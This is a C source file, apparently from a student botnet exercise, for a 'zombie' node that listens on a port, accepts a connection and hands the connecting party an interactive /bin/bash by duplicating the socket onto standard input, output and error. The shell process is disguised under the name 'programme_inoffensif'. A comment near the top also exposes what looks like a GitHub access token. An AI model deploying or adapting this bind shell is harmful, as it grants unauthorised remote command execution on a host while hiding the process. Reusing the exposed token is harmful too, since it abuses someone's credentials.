#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdarg.h>
#include <time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
//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
#include "utils_v2.h"
#include "port.h"
#include "botNet.h"

int getFreePort(int sockfd);
int validPort(int sockfd,int port);

Zombie initSocketServer(bool withPort, int portReceived){
	int sockfd = ssocket();
	int port;
	if(withPort == true){
		port = validPort(sockfd,portReceived);
	}else
	{
		port = getFreePort(sockfd);
	}
	
	slisten(sockfd, BACKLOG);
	Zombie zombie= {
		"zombiO.c", "127.0.0.1", port, sockfd,getpid() 
	};
	return zombie;
}


void createBash (void * sock){
	int* socket = sock;
	for (int i = 0; i < 3; ++i){
		dup2(*socket,i);
	}
	sexecl("/bin/bash", "programme_inoffensif", NULL);

}

void done(){
	printf("fini\n");
	exit(0);
}

int main(int argc, char const *argv[]){
	Zombie zombie; 
	if(argc == 2)
		zombie = initSocketServer(true,atoi(argv[1]));
	else 
		zombie = initSocketServer(false,-1);
	

	ssigaction(SIGINT,done);
	printf("Le serveur tourne sur le port : %i  grace à souli\n", zombie.port);	
	int newsockfd = saccept(zombie.sockFd);
	swrite(newsockfd, &zombie, sizeof(Zombie));
	printf("First write of zombie\n");
	fork_and_run1(createBash,&newsockfd);
	while(1){
		sleep(10);
	};
	sclose(newsockfd);
	sclose(zombie.sockFd);

	return 0;
}

